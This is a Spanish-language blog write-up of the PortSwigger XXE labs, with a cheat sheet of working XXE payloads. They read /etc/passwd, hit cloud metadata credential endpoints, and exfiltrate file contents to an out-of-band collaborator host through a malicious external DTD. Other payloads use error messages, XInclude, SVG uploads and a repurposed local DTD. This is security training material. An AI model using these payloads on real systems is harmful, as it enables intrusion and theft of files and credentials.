---
layout: single
title: XXE - PortSwigger
excerpt: "All XML external entity labs of PortSwigger with additional CheetSheet."
date: 2025-08-16
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - XXE
  - XXE CheetSheet
---


## XXE CheetSheet

- Insertar entidad

```xml
<!DOCTYPE foo [<!ENTITY myName "testing123">]>
<test>&myName;</test>
```

- Ver archivos internos

```xml
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
<test>&myFile;</test>
```

- SSRF

```xml
<!DOCTYPE foo [<!ENTITY myRequest SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<test>&myRequest;</test>
```

- Entidad de parámetro

```xml
<!DOCTYPE foo [<!ENTITY % myReq SYSTEM "https://p6wtrgtwt0exlfffdedxknygv710pqdf.oastify.com"> %myReq;]>
```

- DTD para leer archivos

```xml
<!ENTITY % myFile SYSTEM "file:///etc/hostname">
<!ENTITY % first "<!ENTITY &#x25; second SYSTEM 'https://isemd9fpft0q7818z7zq6gk9h0ntblza.oastify.com/?data=%myFile;'>">

%first;
%second;
```

- DTD para leer archivos en los errores de la respuesta

```xml
<!ENTITY % myFile SYSTEM "file:///etc/passwd">
<!ENTITY % first "<!ENTITY &#x25; second SYSTEM 'file:///test/%myFile;'>">

%first;
%second;
```

- XInclude (Usar en el caso de no poder usar un DTD)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

- XXE en archivos svg

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/hostname">]>

<svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="200px" height="200px">
<text font-size="15" x="8" y="28">&myFile;</text>
</svg>
```

- Abuso del archivo interno /usr/share/yelp/dtd/docbookx.dtd

```xml
<!DOCTYPE foo [
<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; myFile SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; first "<!ENTITY &#x26;#x25; second SYSTEM &#x27;file:///test/&#x25;myFile;&#x27;>">
&#x25;first;
&#x25;second;
'>
%local;
]>
```
## XXE para leer archivos con entidades externas || Exploiting XXE using external entities to retrieve files

![](/img2/Pasted%20image%2020250814214842.png)

> Para ver si es vulnerable a XXE podemos inyectar una entidad.

![](/img2/Pasted%20image%2020250814215042.png)

- Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
  <stockCheck>
    <productId>
	    &myFile;
	</productId>
    <storeId>
	    1
    </storeId>
  </stockCheck>
```

## XXE para realizar ataques SSRF || Exploiting XXE to perform SSRF attacks

![](/img2/Pasted%20image%2020250814220834.png)

> Igual que antes comprobamos si es vulnerable mediante una entidad.

![](/img2/Pasted%20image%2020250814221310.png)

- Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY myRequest SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
  <stockCheck>
    <productId>
	    &myRequest;
	</productId>
    <storeId>
	    1
	</storeId>
  </stockCheck>
```

## XXE ciego con interacción out-of-band || Blind XXE with out-of-band interaction

![](/img2/Pasted%20image%2020250814223415.png)

![](/img2/Pasted%20image%2020250814223447.png)

- Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY myRequest SYSTEM "https://5ms97w9c9gud1vvvtutd03ewbnhe54tt.oastify.com/testing123">]>
  <stockCheck>
    <productId>
	    &myRequest;
	</productId>
	<storeId>
		1
	</storeId>
  </stockCheck>
```

## XXE ciego con entidades XML externas (OOB) || Blind XXE with out-of-band interaction via XML parameter entities

![](/img2/Pasted%20image%2020250814225303.png)

> Vemos que no está permitido insertar entidades dentro del XML.

![](/img2/Pasted%20image%2020250814225107.png)

![](/img2/Pasted%20image%2020250814225143.png)

> Para ejecutar una entidad sin que el servidor nos bloquee la petición, podemos hacer uso de una entidad de parámetro.

- Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY % myReq SYSTEM "https://p6wtrgtwt0exlfffdedxknygv710pqdf.oastify.com"> %myReq;]>
  <stockCheck>
    <productId>
		1
	</productId>
	<storeId>
		1
	</storeId>
  </stockCheck>
```

## XXE ciego con exfiltración vía DTD externa || Exploiting blind XXE to exfiltrate data using a malicious external DTD

![](/img2/Pasted%20image%2020250814234812.png)

![](/img2/Pasted%20image%2020250814234549.png)

![](/img2/Pasted%20image%2020250814234715.png)

> Para explotar un ataque OOB tenemos que hacer una petición a un archivo DTD malicioso, este archivo primero crea una entidad la cual extrae el contenido del archivo '/etc/hostname'. Una vez creada la primera entidad, creamos una segunda entidad la cual crea otra definición que usa el contenido de la primera, es decir el contenido del archivo '/etc/hostname' para pasar el  resultado a nuestro servidor.

- Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY % myReq SYSTEM "https://exploit-0ad60019037d6e5380b8e98b015f0076.exploit-server.net/exploit">%myReq;]>
  <stockCheck>
    <productId>
	    1
	</productId>
	<storeId>
		1
	</storeId>
  </stockCheck>
```

```xml
<!ENTITY % myFile SYSTEM "file:///etc/hostname">
<!ENTITY % first "<!ENTITY &#x25; second SYSTEM 'https://isemd9fpft0q7818z7zq6gk9h0ntblza.oastify.com/?data=%myFile;'>">

%first;
%second;
```

## XXE ciego para filtrar datos con errores || Exploiting blind XXE to data via error messages

![](/img2/Pasted%20image%2020250816142325.png)

![](/img2/Pasted%20image%2020250816142350.png)

> Una vez comprobado que se trata de un ataque OOB, vemos que nos está mostrando el tipo de error en la respuesta, esto nos puede servir para intentar leer cualquier archivo reflejado en el error.

![](/img2/Pasted%20image%2020250816142532.png)

![](/img2/Pasted%20image%2020250816142629.png)

> Para ver el contenido de un archivo reflejado en la respuesta podemos intentar cargar un archivo en el sistema con una ruta errónea, la cual contiene la información de la entidad de parámetro creada en primer lugar.

- Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [<!ENTITY % myReq SYSTEM "https://exploit-0ad60019037d6e5380b8e98b015f0076.exploit-server.net/exploit">%myReq;]>
  <stockCheck>
    <productId>
	    1
	</productId>
	<storeId>
		1
	</storeId>
  </stockCheck>
```

```xml
<!ENTITY % myFile SYSTEM "file:///etc/passwd">
<!ENTITY % first "<!ENTITY &#x25; second SYSTEM 'file:///test/%myFile;'>">

%first;
%second; 
```

## XInclude para leer archivos || Exploiting XInclude to retrieve files

![](/img2/Pasted%20image%2020250816164024.png)

> Para identificar que se está empleando XML por detrás, podemos insertar una etiqueta XML.

![](/img2/Pasted%20image%2020250816164157.png)

> Como no tenemos la capacidad de implementar un DTD, podemos hacer uso de XInclude.

- Injection

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## XXE vía subida de imagen maliciosa || Exploiting XXE via image file upload

![](/img2/Pasted%20image%2020250816171516.png)

![](/img2/Pasted%20image%2020250816171657.png)

> Para ver el tipo de archivos que se están usando a la hora de crear un avatar, podemos descargarnos el avatar de cualquier usuario de ejemplo y enviarlo como nuestro avatar.

![](/img2/Pasted%20image%2020250816171909.png)

> Vemos que la estructura del archivo es de tipo svg+xml.

![](/img2/Pasted%20image%2020250816172502.png)

![](/img2/Pasted%20image%2020250816172537.png)

> Probamos a insertar cualquier texto dentro de una imagen svg.

![](/img2/Pasted%20image%2020250816172750.png)

![](/img2/Pasted%20image%2020250816172834.png)

- Injection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/hostname">]>

<svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="200px" height="200px">
<text font-size="15" x="8" y="28">&myFile;</text>
</svg>
```

## XXE usando DTD local para extraer datos || Exploiting XXE to retrieve data by repurposing a local DTD

![](/img2/Pasted%20image%2020250816191411.png)

> Para acceder a un archivo DTD interno podemos usar la ruta /usr/share/yelp/dtd/docbookx.dtd, esta ruta contiene varias entidades como 'ISOamso'. Dentro de este archivo se crea la entidad y posteriormente se expande, esto lo podemos aprovechar para modificar el contenido de dicha entidad. Para modificar el contenido primero tenemos que crear y expandir una entidad la cual contenga el archivo a editar. En segundo lugar, referenciamos la entidad la cual queramos modificar, en este caso 'ISOamso' añadiéndole como contenido las instrucciones que nosotros queramos.

![](/img2/Pasted%20image%2020250816191214.png)

> Al modificar la entidad 'ISOamso' empleamos la misma estrategia vista en un laboratorio anterior, la cual consiste en forzar un error al cargar una entidad de parámetro dentro de una ruta inexistente, sin embargo, al estar dentro del contexto de una entidad y de unas comillas simples, es necesario cambiar la representación de algunos caracteres.

![](/img2/Pasted%20image%2020250816191036.png)

> Todos los % están representados en hexadecimal excepto el que se encuentra dentro del contexto de la segunda entidad, este se representa de la misma forma excepto por el & que lo representamos en hexadecimal. Además para que no se corrompa el contexto de las comillas simples es necesario representarlas en hexadecimal.

- Injection

```xml
<!DOCTYPE foo [
<!ENTITY % local SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; myFile SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; first "<!ENTITY &#x26;#x25; second SYSTEM &#x27;file:///test/&#x25;myFile;&#x27;>">
&#x25;first;
&#x25;second;
'>
%local;
]>
```